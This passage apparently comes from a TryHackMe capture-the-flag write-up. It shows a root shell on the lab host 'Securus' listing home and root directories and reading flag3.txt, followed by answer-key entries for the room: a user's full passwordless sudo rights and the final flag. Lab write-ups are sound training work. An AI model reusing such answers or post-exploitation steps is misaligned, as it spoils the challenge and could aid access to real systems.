drwxr-xr-x 4 root   root   4096 Apr 26  2020 ..
-rw-r--r-- 1 jsmith jsmith  220 Nov  5  2016 .bash_logout
-rw-r--r-- 1 jsmith jsmith 3515 Nov  5  2016 .bashrc
-rw-r--r-- 1 jsmith jsmith   33 Apr 25  2020 flag2.txt
-rw-r--r-- 1 jsmith jsmith  675 Nov  5  2016 .profile
root@Securus:/home/jsmith# cd /root
cd /root
root@Securus:~# ls -la
ls -la
total 28
drwx------  4 root root 4096 Apr 26  2020 .
drwxr-xr-x 22 root root 4096 Apr 17  2020 ..
lrwxrwxrwx  1 root root    9 Apr 22  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   43 Apr 25  2020 flag3.txt
drwx------  2 root root 4096 Apr 23  2020 .gnupg
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwx------  2 root root 4096 Apr 17  2020 .ssh
root@Securus:~# cat flag3.txt
cat flag3.txt
THM{Great_work!_You_pwned_Erit_Securus_1!}

```

What sudo rights does jsmith have?
*(ALL : ALL) NOPASSWD: ALL*



Flag 3
*THM{Great_work!_You_pwned_Erit_Securus_1!}*



[[PowerShell for Pentesters]]